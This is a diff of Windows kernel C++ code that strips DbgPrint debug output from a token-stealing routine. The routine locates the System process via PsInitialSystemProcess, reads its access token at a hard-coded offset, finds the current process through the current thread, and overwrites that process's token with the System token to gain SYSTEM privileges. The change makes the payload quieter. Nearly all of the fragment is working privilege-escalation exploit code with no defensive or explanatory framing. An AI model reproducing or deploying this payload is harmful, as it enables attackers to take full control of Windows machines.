@@ -153,25 +153,19 @@ public:
 
 		// get pointer to eprocess
 		auto systemEProcess = *(void**)PsInitialSystemProcess;
-		DbgPrint("[*] System : 0x%p\n", systemEProcess);
-
+		
 		auto systemProcessToken = *(void**)((byte*)systemEProcess + 0xf8);
-		DbgPrint("[*] systemProcessToken : %p\n", systemProcessToken);
-
+		
 		auto currHandle = PsGetCurrentProcessId();
-		DbgPrint("[*] currHandle : %p\n", static_cast<void*>(currHandle));
 		
 		auto currThread = KeGetCurrentThread();
-		DbgPrint("[*] currThread : %p\n", static_cast<void*>(currThread));
-
+		
 		// KTHREAD->ApcState->Process = KPROCESS
 		auto currProcess = *(void**)((byte*)currThread + 0x50);
-		DbgPrint("[*] currProcess : %p\n", currProcess);
-
+		
 		// process->token 
 		auto currProcessToken = *(void**)((byte*)currProcess + 0xf8);
-		DbgPrint("[*] currProcessToken : %p\n", currProcessToken);
-
+		
 		auto currProcessTokenOffset = ((byte*)currProcess + 0xf8);
 		auto systemProcessTokenOffset = ((byte*)systemEProcess + 0xf8);
 		*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;
